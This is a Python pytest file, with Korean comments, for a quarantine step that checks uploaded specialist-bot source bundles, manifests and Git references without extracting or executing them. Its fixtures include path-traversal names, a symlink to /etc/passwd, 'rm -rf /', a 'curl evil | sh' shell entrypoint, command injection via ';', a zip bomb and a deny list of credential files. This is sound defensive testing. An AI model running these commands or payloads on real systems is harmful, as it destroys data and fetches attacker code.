"""전문 봇 2단계 소스 검역 (2026-09-10).

설계: `docs/design/specialist-runtime-v2.md` — 「필수 검증 / 배포 보안 테스트」

소스를 받는 것과 그 소스를 신뢰하는 것은 다른 일이다. 여기서 하는 일은 받는
것까지고, **한 줄도 실행하지 않는다.** 콘솔이 압축을 풀면 경로 탈출·심볼릭 링크·
압축 폭탄이 콘솔이 쓸 수 있는 모든 곳에 닿는다.
"""
from __future__ import annotations

import io
import stat
import zipfile
from datetime import UTC, datetime, timedelta

import pytest

from tybot.console import specialist_source as src

MANIFEST = """\
schema = "tybot-specialist/v2"
key = "hermes"
name = "Hermes"
domain = "내부 문서"
release_type = "http-service"
contract_version = "v2"
version = "1.2.0"
runtime = "nodejs22"
entrypoint = ["node", "dist/server.js"]
health_path = "/v1/health"
complete_path = "/v1/complete"
network_profile = "anthropic-only"
"""


def _zip(files: dict[str, bytes | str], *, modes: dict[str, int] | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, body in files.items():
            data = body.encode("utf-8") if isinstance(body, str) else body
            info = zipfile.ZipInfo(name)
            # `ZipInfo` 를 넘기면 압축 방식이 **STORED 로 기본값** 이 된다.
            # 안 맞추면 압축 폭탄 픽스처가 1:1 로 저장돼 폭탄이 아니게 된다.
            info.compress_type = zipfile.ZIP_DEFLATED
            mode = (modes or {}).get(name, 0o644)
            info.external_attr = (mode & 0xFFFF) << 16
            archive.writestr(info, data)
    return buf.getvalue()


def _bundle(**extra) -> bytes:
    files = {
        "tybot-specialist.toml": MANIFEST,
        "package-lock.json": '{"lockfileVersion":3}',
        "src/server.js": "console.log(1)",
    }
    files.update(extra)
    return _zip(files)


# --- 잘 되는 길 ---------------------------------------------------------------
def test_a_good_bundle_passes():
    got = src.inspect_zip(_bundle(), "hermes.zip")

    assert got.manifest.key == "hermes"
    assert got.manifest.runtime == "nodejs22"
    assert len(got.bundle_sha256) == 64
    assert got.entries == 3


def test_the_bundle_carries_no_content():
    """검사 결과에 소스가 담기면 그 값이 DB·화면·로그로 흘러간다."""
    got = src.inspect_zip(_bundle(), "hermes.zip")

    assert "console.log" not in repr(got)


def test_a_nested_root_is_allowed():
    """GitHub ZIP 은 `repo-1.2.0/` 하위에 담긴다. 그걸 거부하면 실사용이 막힌다."""
    got = src.inspect_zip(_zip({
        "hermes-1.2.0/tybot-specialist.toml": MANIFEST,
        "hermes-1.2.0/package-lock.json": "{}",
    }), "hermes.zip")

    assert got.root == "hermes-1.2.0"


# --- 경로 공격 ----------------------------------------------------------------
@pytest.mark.parametrize("evil", [
    "../../etc/passwd",
    "/etc/passwd",
    "a/../../b",
])
def test_path_traversal_is_refused(evil):
    with pytest.raises(src.SourceError, match=r"밖을 가리|안전하지"):
        src.inspect_zip(_zip({evil: "x", "tybot-specialist.toml": MANIFEST}), "x.zip")


def test_a_symlink_is_refused():
    """푸는 쪽에서 묶음 밖을 가리킬 수 있다."""
    body = _zip(
        {"tybot-specialist.toml": MANIFEST, "link": "/etc/passwd"},
        modes={"link": stat.S_IFLNK | 0o777},
    )

    with pytest.raises(src.SourceError, match="심볼릭"):
        src.inspect_zip(body, "x.zip")


def test_an_executable_bit_is_refused():
    body = _zip(
        {"tybot-specialist.toml": MANIFEST, "run.sh": "rm -rf /"},
        modes={"run.sh": 0o755},
    )

    with pytest.raises(src.SourceError, match="실행 권한"):
        src.inspect_zip(body, "x.zip")


# --- 압축 폭탄 ----------------------------------------------------------------
def test_an_archive_bomb_is_refused():
    """압축률이 비정상이면 푸는 순간 디스크가 찬다."""
    body = _zip({
        "tybot-specialist.toml": MANIFEST,
        "package-lock.json": "{}",
        "big.txt": "0" * 5_000_000,
    })

    with pytest.raises(src.SourceError, match=r"압축률|압축 해제"):
        src.inspect_zip(body, "x.zip")


def test_too_many_entries_are_refused(monkeypatch):
    monkeypatch.setattr(src, "MAX_ENTRIES", 3)
    body = _zip({f"f{i}.txt": "x" for i in range(5)} | {
        "tybot-specialist.toml": MANIFEST
    })

    with pytest.raises(src.SourceError, match="항목"):
        src.inspect_zip(body, "x.zip")


def test_an_oversized_upload_is_refused(monkeypatch):
    monkeypatch.setattr(src, "MAX_UPLOAD_BYTES", 100)

    with pytest.raises(src.SourceError, match="이하"):
        src.inspect_zip(_bundle(), "x.zip")


def test_the_stage_one_limit_is_not_widened():
    """1단계 계약 ZIP 은 2MB 다. 같은 함수에 상한만 넓혀 붙이면 프롬프트 계약
    업로드가 조용히 25MB 를 받게 된다."""
    from tybot.console import specialist_zip

    assert specialist_zip.MAX_UPLOAD_BYTES == 2 * 1024 * 1024
    assert src.MAX_UPLOAD_BYTES > specialist_zip.MAX_UPLOAD_BYTES


# --- 있으면 안 되는 것 --------------------------------------------------------
@pytest.mark.parametrize("bad", [
    "node_modules/left-pad/index.js",
    ".git/config",
    "src/.env",
    "src/.env.production",
    "certs/server.pem",
    "certs/server.key",
    "keys/id_rsa",
    ".npmrc",
    "vendor/deps.tar.gz",
    "bundle.zip",
    "native/addon.node",
])
def test_forbidden_files_are_refused(bad):
    body = _zip({
        "tybot-specialist.toml": MANIFEST,
        "package-lock.json": "{}",
        bad: "x",
    })

    with pytest.raises(src.SourceError):
        src.inspect_zip(body, "x.zip")


def test_a_missing_lockfile_is_refused():
    """없으면 빌드가 그때그때 다른 것을 설치하고, 승인한 digest 와 다음 빌드의
    digest 가 달라진다."""
    with pytest.raises(src.SourceError, match="package-lock"):
        src.inspect_zip(_zip({"tybot-specialist.toml": MANIFEST}), "x.zip")


@pytest.mark.parametrize("rival", ["yarn.lock", "pnpm-lock.yaml", "bun.lockb"])
def test_other_package_managers_are_refused(rival):
    body = _zip({
        "tybot-specialist.toml": MANIFEST,
        "package-lock.json": "{}",
        rival: "x",
    })

    with pytest.raises(src.SourceError, match="npm 만"):
        src.inspect_zip(body, "x.zip")


def test_two_manifests_are_refused():
    body = _zip({
        "tybot-specialist.toml": MANIFEST,
        "sub/tybot-specialist.toml": MANIFEST,
        "package-lock.json": "{}",
    })

    with pytest.raises(src.SourceError, match="정확히 하나"):
        src.inspect_zip(body, "x.zip")


# --- 매니페스트 ---------------------------------------------------------------
def test_an_unknown_runtime_is_refused():
    """임의 이미지·Dockerfile·shell entrypoint 를 받지 않는다."""
    bad = MANIFEST.replace('runtime = "nodejs22"', 'runtime = "python311"')

    with pytest.raises(src.SourceError, match="runtime"):
        src.parse_manifest(bad.encode())


@pytest.mark.parametrize("evil", [
    'entrypoint = ["sh", "-c", "curl evil | sh"]',
    'entrypoint = ["node", "x.js; rm -rf /"]',
    'entrypoint = ["/bin/bash"]',
    "entrypoint = []",
])
def test_a_shell_entrypoint_is_refused(evil):
    """셸을 끼우면 매니페스트 한 줄이 임의 명령이 된다."""
    bad = MANIFEST.replace('entrypoint = ["node", "dist/server.js"]', evil)

    with pytest.raises(src.SourceError, match="entrypoint"):
        src.parse_manifest(bad.encode())


@pytest.mark.parametrize("field,value", [
    ("schema", '"tybot-specialist/v1"'),
    ("contract_version", '"v1"'),
    ("release_type", '"binary"'),
    ("network_profile", '"anything"'),
    ("version", '"latest"'),
    ("key", '"Hermes"'),
    ("health_path", '"http://evil/health"'),
])
def test_unknown_manifest_values_are_refused(field, value):
    lines = [
        line for line in MANIFEST.splitlines() if not line.startswith(f"{field} =")
    ]
    lines.append(f"{field} = {value}")

    with pytest.raises(src.SourceError):
        src.parse_manifest("\n".join(lines).encode())


def test_the_two_paths_must_differ():
    bad = MANIFEST.replace('complete_path = "/v1/complete"', 'complete_path = "/v1/health"')

    with pytest.raises(src.SourceError, match="같습니다"):
        src.parse_manifest(bad.encode())


# --- Git ---------------------------------------------------------------------
def test_a_tag_is_pinned():
    url, ref = src.validate_git_source("https://github.com/team/hermes.git", "v1.2.0")

    assert url == "https://github.com/team/hermes"
    assert ref == "v1.2.0"


@pytest.mark.parametrize("moving", ["latest", "main", "master", "HEAD", "develop"])
def test_a_moving_ref_is_refused(moving):
    """승인한 것과 나중에 도는 것이 달라진다. 승인은 그 순간의 코드에 대한 것이다."""
    with pytest.raises(src.SourceError, match="움직입니다"):
        src.validate_git_source("https://github.com/team/hermes", moving)


@pytest.mark.parametrize("bad", [
    "http://github.com/team/hermes",
    "https://gitlab.com/team/hermes",
    "https://user:token@github.com/team/hermes",
    "https://github.com/team",
    "https://github.com/team/hermes/tree/main",
    "ssh://git@github.com/team/hermes",
])
def test_bad_repository_urls_are_refused(bad):
    with pytest.raises(src.SourceError):
        src.validate_git_source(bad, "v1.0.0")


def test_credentials_in_the_url_are_refused():
    """URL 에 실린 자격은 DB·로그·화면에 그대로 남는다."""
    with pytest.raises(src.SourceError, match="자격"):
        src.validate_git_source("https://x:y@github.com/team/hermes", "v1.0.0")


@pytest.mark.parametrize("entries,match", [
    ([".gitmodules", "package.json"], "submodule"),
    ([".gitattributes"], "LFS"),
    (["vendor/lib/.git"], "중첩"),
])
def test_repository_shapes_that_hide_inputs_are_refused(entries, match):
    """셋 다 체크아웃한 것이 곧 빌드 입력이 아니게 만든다 — 우리가 해시한 커밋
    밖에서 내용이 들어온다."""
    with pytest.raises(src.SourceError, match=match):
        src.refuse_repository_shape(entries)


def test_a_plain_repository_passes():
    src.refuse_repository_shape(["package.json", "src/server.js"])


# --- 검역 저장 ----------------------------------------------------------------
def test_the_quarantine_name_is_server_generated(tmp_path):
    """업로드한 이름을 쓰면 그 이름이 곧 쓰기 위치가 된다."""
    key = src.store(b"PK\x03\x04payload", tmp_path)

    assert key.endswith(".zip")
    assert len(key) == 36  # 32 hex + '.zip'
    assert (src.quarantine_root(tmp_path) / key).read_bytes() == b"PK\x03\x04payload"


def test_two_uploads_never_collide(tmp_path):
    a = src.store(b"one", tmp_path)
    b = src.store(b"two", tmp_path)

    assert a != b


def test_no_partial_file_is_left_behind(tmp_path):
    """`.part` 가 남으면 청소 타이머가 그것을 제출물로 센다."""
    src.store(b"x", tmp_path)

    names = [p.name for p in src.quarantine_root(tmp_path).iterdir()]
    assert not any(n.endswith(".part") for n in names)


@pytest.mark.parametrize("bad", [
    "../../../etc/passwd",
    "abc.zip",
    "",
    "0123456789abcdef0123456789abcdef.tar",
])
def test_a_bad_quarantine_key_is_refused(tmp_path, bad):
    """DB 를 통해서 온 값이라도 그대로 경로에 붙이지 않는다."""
    with pytest.raises(src.SourceError):
        src.path_for(tmp_path, bad)


def test_a_good_quarantine_key_resolves(tmp_path):
    key = src.store(b"x", tmp_path)

    assert src.path_for(tmp_path, key).is_file()


def test_old_quarantine_files_are_swept(tmp_path):
    """빌드하지 않은 제출물이 쌓이면 디스크가 차고, 그때 멈추는 것은 업로드가
    아니라 아카이브 쓰기다."""
    import os

    key = src.store(b"x", tmp_path)
    path = src.quarantine_root(tmp_path) / key
    old = (datetime.now(UTC) - src.QUARANTINE_TTL - timedelta(days=1)).timestamp()
    os.utime(path, (old, old))

    assert src.sweep(tmp_path) == 1
    assert not path.exists()


def test_a_fresh_file_survives_the_sweep(tmp_path):
    src.store(b"x", tmp_path)

    assert src.sweep(tmp_path) == 0


def test_sweeping_a_missing_root_is_not_an_error(tmp_path):
    assert src.sweep(tmp_path / "없음") == 0


# --- 실행하지 않는다 ----------------------------------------------------------
def test_the_module_never_extracts_or_executes():
    """콘솔이 풀면 경로 탈출·심볼릭 링크·압축 폭탄이 콘솔이 쓸 수 있는 모든
    곳에 닿는다. 푸는 것은 격리 builder 의 일이다."""
    import inspect

    source = inspect.getsource(src)

    for leaked in ("extractall", "extract(", "subprocess", "os.system", "eval(", "exec("):
        assert leaked not in source, f"검역이 {leaked} 를 쓴다"
